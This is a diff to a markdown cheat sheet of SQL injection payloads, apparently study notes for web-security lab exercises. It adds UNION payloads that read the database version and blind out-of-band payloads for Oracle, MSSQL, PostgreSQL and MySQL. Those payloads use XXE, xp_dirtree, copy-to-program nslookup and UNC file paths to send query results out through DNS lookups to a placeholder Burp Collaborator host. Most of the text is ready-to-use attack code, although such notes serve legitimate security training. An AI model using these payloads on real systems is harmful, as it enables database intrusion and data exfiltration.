@@ -1,3 +1,13 @@
+# Retrieve Orcale database version with a UNION injection with two columns output
+```sql
+'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
+```
+
+# Retrieve Microsoft SQL database version with a UNION injection with two columns output
+```sql
+'+UNION+SELECT+@@version,NULL--+-
+```
+
 # Retrieve multiple values in a single column
 
 ### Scenario
@@ -15,7 +25,7 @@ We can abuse the string concatenation in SQL:
 
 ### Scenario
 
-There is a SQL injection point in the "Cookie" request parameter. If the injection is correct we will obtain a "welcome back" messagge. 
+There is a SQL injection point in the "Cookie" request parameter. If the injection is correct we will obtain a "welcome back" message. 
 
 ### Exploit
 
@@ -157,3 +167,77 @@ x';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password, 1, 1) = 'a
 ```
 
 Another time, using Intruder we can automate the research of the password's chars.
+
+
+# Blind injection with out of band interaction
+
+You can cause the database to perform a DNS lookup to an external domain. To do this, you will need to use Burp Collaborator to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred.
+
+### Oracle DB
+
+(XXE) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:
+
+```sql
+SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
+```
+
+The following technique works on fully patched Oracle installations, but requires elevated privileges:
+
+```sql
+SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')
+```
+
+### Microsoft
+```sql
+exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
+```
+
+### PostgreSQL
+```sql
+copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
+```
+
+### MySQL
+
+The following techniques work on Windows only:
+```sql
+LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
+SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
+```
+
+# Blind injection with out of band data exfiltration
+
+You can cause the database to perform a DNS lookup to an external domain containing the results of an injected query. To do this, you will need to use Burp Collaborator to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to retrieve details of any DNS interactions, including the exfiltrated data. 
+
+### Oracle DB
+```sql
+SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
+```
+
+### MSSQL
+```sql
+declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')
+```
+
+### PostgreSQL
+```sql
+create OR replace function f() returns void as $$
+declare c text;
+declare p text;
+begin
+SELECT into p (SELECT YOUR-QUERY-HERE);
+c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
+execute c;
+END;
+$$ language plpgsql security definer;
+SELECT f();
+```
+
+### MySQL
+
+The following technique works on Windows only:
+
+```sql
+SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
+```
+
